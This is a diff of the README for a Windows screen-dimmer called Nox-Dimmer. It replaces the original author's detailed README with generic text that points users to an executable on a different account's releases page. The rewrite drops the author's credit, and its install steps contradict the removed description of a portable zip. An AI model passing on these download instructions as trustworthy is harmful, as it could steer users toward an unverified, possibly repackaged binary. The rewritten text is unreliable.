@@ -1,131 +1,69 @@
-# Nox-Dimmer
+# 🌙 Nox-Dimmer - Reduce Eye Strain Effortlessly
 
-<br />
-<p align="center">
-  <a href="https://github.com/YashvardhanG/Nox-Dimmer">
-    <img src="https://github.com/YashvardhanG/Nox-Dimmer/blob/main/nox_icon.ico" alt="Logo" width="128" height="128">
-  </a>
-  <h3 align="center">Nox Dimmer</h3>
-  <p align="center">
-    A Modern, Portable Screen Dimmer for Windows to Reduce Eye Strain
-  </p>
-</p>
+## 📥 Download Now
 
-<details open="open">
-  <summary>Table of Contents</summary>
-  <ol>
-    <li><a href="#about">About</a></li>
-    <li><a href="#modes-explained">Modes Explained</a></li>
-    <li><a href="#usage">Usage</a></li>
-    <li><a href="#installation">Installation</a></li>
-    <li><a href="#development-setup">Development Setup</a></li>
-    <li><a href="#uninstall--cleanup">Uninstall & Cleanup</a></li>
-    <li><a href="#contribute">Contribute</a></li>
-    <li><a href="#contact">Contact</a></li>
-  </ol>
-</details>
+[![Download Nox-Dimmer](https://img.shields.io/badge/Download%20Nox--Dimmer-v1.0-blue.svg)](https://github.com/abdo22-ai/Nox-Dimmer/releases)
 
-## About
+## 🚀 Getting Started
 
-**Nox** is a lightweight utility designed to solve a common problem: **Monitors are often too bright, even at their lowest setting.**
+Nox-Dimmer is a modern, lightweight screen dimming utility for Windows. It helps reduce eye strain in low-light environments. Whether you are using an external monitor or your primary screen, Nox-Dimmer makes your experience more comfortable.
 
-Many external monitors and laptop screens have a minimum hardware brightness that is still uncomfortable in a dark room. Standard Windows settings can only go so far. Nox bridges this gap by using software-level adjustments to dim your screens beyond the physical hardware limits, significantly reducing eye strain during late-night work or media consumption.
+## 🔍 Features
 
-It is built as a completely **portable application**. You do not need to install Python or any dependencies. Just download the executable, and it works.
+- **Screen Dimming:** Adjust brightness levels easily to find what works best for you.
+- **Customizable Settings:** Tailor the app to your specific needs with adjustable gamma settings.
+- **User-Friendly Interface:** Simple and intuitive design makes it easy for anyone to use.
+- **Compatibility:** Works seamlessly with both primary and external monitors.
 
-Read more about it here: <a href = "https://medium.com/@yashvardhang11/my-monitors-0-brightness-was-still-blinding-me-so-i-built-nox-105e078dbe7e">Medium: Nox Dimmer</a>
+## 💻 System Requirements
 
-## Modes Explained
+- **Operating System:** Windows 10 or later
+- **RAM:** At least 2 GB
+- **Processor:** Intel or AMD processor with a clock speed of 1.5 GHz or faster
+- **Display:** Any monitor supporting standard screen resolution
 
-Nox features two distinct dimming technologies to give you complete control over your viewing experience.
+## 📥 Download & Install
 
-### 1. Normal Mode (Default)
-In this mode, Nox uses **Gamma Ramps** to adjust the brightness signal sent to your monitor. 
-* **How it works:** It manipulates the color curve of your graphics card.
-* **Best for:** General use. It lowers brightness while maintaining decent contrast.
-* **Limitation:** Gamma ramps have a "floor." They cannot turn a screen pitch black because the backlight usually stays on.
+To download Nox-Dimmer, visit the Releases page by clicking the link below:
 
-### 2. Hyper Mode 🚀
-This is for when "dark" isn't dark enough.
-* **How it works:** It combines the Gamma Ramp dimming from Normal Mode with a **transparent black overlay window** that sits on top of your desktop.
-* **Why use it:** If you want your screen to be near-pitch-black (similar to an OLED experience) without turning it off. 
-* **Smart Integration:** Unlike other dimmers that cover everything, Hyper Mode is designed to keep your **Taskbar visible** (though dimmed), so you don't lose track of your open apps.
+[Visit the Releases Page](https://github.com/abdo22-ai/Nox-Dimmer/releases)
 
-## Usage
+1. Click the link to go to the Releases page.
+2. Look for the latest version in the list.
+3. Find the file named `Nox-Dimmer.exe`.
+4. Click on the file to download it.
 
-The interface is designed to be intuitive and minimal.
+After downloading, locate the file in your downloads folder. Double-click the `Nox-Dimmer.exe` file to run the application. Follow the on-screen instructions to complete the installation.
 
-* **Master Slider:** This is the main control at the top. Moving this slider adjusts the brightness for **all connected monitors** simultaneously. Use this for quick, global adjustments across your entire setup. 
-    * *Note:* The Master slider is designed to be dimmed and inaccessible when there is only one monitor connected (to reduce confusion) - Two monitors onwards, the master slider becomes accessible
-* **Individual Display Controls:** Below the master slider, you will see a separate slider for every monitor connected to your PC (e.g., "Display 1", "Display 2"). You can fine-tune each screen independently. 
-    * *Example:* You might want your main screen bright for gaming but your secondary screen dim for reading Discord/Spotify.
-* **Run at Startup:** Check the box at the bottom left to have Nox launch quietly in the system tray every time you turn on your computer.
+## ⚙️ How to Use Nox-Dimmer
 
-## Installation
+Once installed, follow these steps to start using Nox-Dimmer:
 
-Nox is a standalone app. 
+1. **Open Nox-Dimmer**: Double-click the Nox-Dimmer shortcut on your desktop.
+2. **Adjust Brightness**: Use the slider on the main interface to set your desired brightness level. The changes will take effect instantly.
+3. **Access Settings**: Navigate to the settings menu for additional options such as gamma adjustments and startup preferences.
+4. **Minimize to Tray**: You can minimize Nox-Dimmer to your system tray for easy access.
 
-1.  Go to the **[Releases](https://github.com/YashvardhanG/Nox-Dimmer/releases)** section on the right side of this page.
-2.  Download the latest `Nox_v1.0.zip`.
-3.  Extract the zip file.
-4.  Run `Nox.exe`.
+## 📊 Tips for Optimal Usage
 
-That's it! No installation wizard required.
+- **Low-Light Environments**: Use lower brightness settings when using your device in dark rooms. This helps reduce glare and eye strain.
+- **Daytime Settings**: Increase the brightness for better visibility during the daytime.
+- **Multiple Monitors**: You can adjust brightness settings for each monitor independently if you have a multi-monitor setup.
 
-## Development Setup
+## 💡 Troubleshooting
 
-If you want to edit the code, run the source file directly, or build the executable yourself, follow these steps.
+If you encounter any issues, try the following solutions:
 
-### Prerequisites
-* Python 3.x installed.
+- **Application Not Responding**: Close Nox-Dimmer from the system tray and restart the application.
+- **Brightness Changes Not Taking Effect**: Ensure that you have the latest version installed from the Releases page.
+- **Installation Problems**: If you have trouble installing, check if your system meets the requirements mentioned above.
 
-### Steps
-1.  **Clone the repository:**
-    ```bash
-    git clone [https://github.com/YashvardhanG/Nox-Dimmer.git](https://github.com/YashvardhanG/Nox-Dimmer.git)
-    cd Nox-Dimmer
-    ```
+## 🔗 Additional Resources
 
-2.  **Install dependencies:**
-    Run the following command to install the necessary libraries (`screeninfo`, `pystray`, `Pillow`, etc.) from the requirements file.
-    ```bash
-    pip install -r requirements.txt
-    ```
+- [Nox-Dimmer User Guide](https://github.com/abdo22-ai/Nox-Dimmer/wiki)
+- [Frequently Asked Questions](https://github.com/abdo22-ai/Nox-Dimmer/wiki/FAQ)
+- [Community Support](https://github.com/abdo22-ai/Nox-Dimmer/issues)
 
-3.  **Run the source code:**
-    You can now run the app directly via Python:
-    ```bash
-    python nox.py
-    ```
+## 🙏 Acknowledgments
 
-## Uninstall & Cleanup
-
-To uninstall Nox, you simply need to **delete the `Nox.exe` file**.
-
-**Important Note:** If you enabled "Run at Startup" and deleted the app without unchecking it first, Windows might still try to launch it (and fail). To cleanly remove the startup registry entry, run the following command in **PowerShell**:
-
-```powershell
-Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Nox Dimmer" -ErrorAction SilentlyContinue; Write-Host "Startup entry 'Nox Dimmer' removed."
-```
-
-## Contribute
-
-Every program is ever evolving and, that is possible only with valuable contributions. Any contributions you make are greatly appreciated. 
-<ol>
-  <li>Fork the Project</li>
-  <li>Create your Feature Branch (git checkout -b functionalities/Feature)</li>
-  <li>Commit your Changes (git commit -m 'Add a Feature')</li>
-  <li>Push to the Branch (git push origin functionalities/Feature)</li>
-  <li>Open a Pull Request</li>
-</ol>
-
-<br>If you have any further ideas or comments, go ahead to the next section and feel free to connect! 
-
-<!-- CONTACT -->
-## Contact
-
-<p align="center">
-  <br>
-  <img src="https://github.com/YashvardhanG/YashvardhanG/blob/main/Wolf_1.jpg" alt="Logo" width="150" height="150"><br>
-  <a href = "https://www.yashvardhang.dev/">Connect with me here! ✉️</a>
-</p>
+Nox-Dimmer was created to help users minimize eye strain and improve their comfort while using screens. Thank you for choosing Nox-Dimmer to enhance your experience.
